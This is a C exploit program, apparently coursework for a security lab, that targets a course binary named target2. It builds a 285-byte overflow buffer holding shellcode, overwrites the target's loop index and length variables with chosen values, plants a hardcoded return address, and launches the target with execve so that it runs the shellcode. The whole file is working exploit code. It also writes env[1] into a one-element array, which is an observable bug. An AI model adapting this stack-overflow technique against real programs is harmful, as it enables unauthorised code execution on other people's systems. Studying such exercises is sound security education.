#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

//My own constants
#define BUFSIZE 285
#define TARGET_RA_ADDR 0x202dfd40
#define SHELL_LENGTH 45
#define OVERWRITE_I 0x0101010B	//this value overwritten in i's place
#define OVERWRITE_LEN 0x0000011B	// 283 - this value overwritten in len's place

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	//printf("Sploit2.c: Before making attack_buffer:\n");
	
	//making the attack buffer
	char attack_buffer[BUFSIZE];
	
	//First fill attack buffer with non null characters to avoid reaching nulls in random places when sending buffer
	int i;
	for(i = 0; i< BUFSIZE;i++)
	{
		attack_buffer[i] = 0x04;
	}

	//Fill first 45 bytes of buffer with shellcode
	for(i = 0; i< SHELL_LENGTH;i++)//copying 45 bytes from index 0, because 46th byte is a NULL character
	{
		attack_buffer[i] = shellcode[i];
	}

	//Some portion with random value just to help debug
	for(i = 45 ; i < 264; i++)
	{
		attack_buffer[i] = 0x05;
	}

	//Indexes 264 to 267 of attack buffer since going to overwrite i with 267 and then becomes 268 when i increments by one
	int *a = (int*) &attack_buffer[264];
	*a = OVERWRITE_I;

	//indexes 268 to 271 of attack buffer since going to overwrite len with 283 as want to keep copying till end of attack buffer
	int *b = (int *) &attack_buffer[268];
	*b  = OVERWRITE_LEN;

	//indexes 280 to 283 of attack buffer since going to write in the return address of buf
	int *c = (int *) &attack_buffer[280];
	*c = TARGET_RA_ADDR;

	//Put a null character at end of attack_buffer which is at index 284.
	attack_buffer[BUFSIZE - 1] = '\0';

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	//env[0] will copy till the first null terminator which would be at itself at attack_buffer[271] 
	env[0] = &attack_buffer[271];
	
	//env[1] will copy till the first null terminator which would be at end of buffer at attack_buffer[284]
	env[1] = &attack_buffer[272];
	


	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");
	return (0);
}

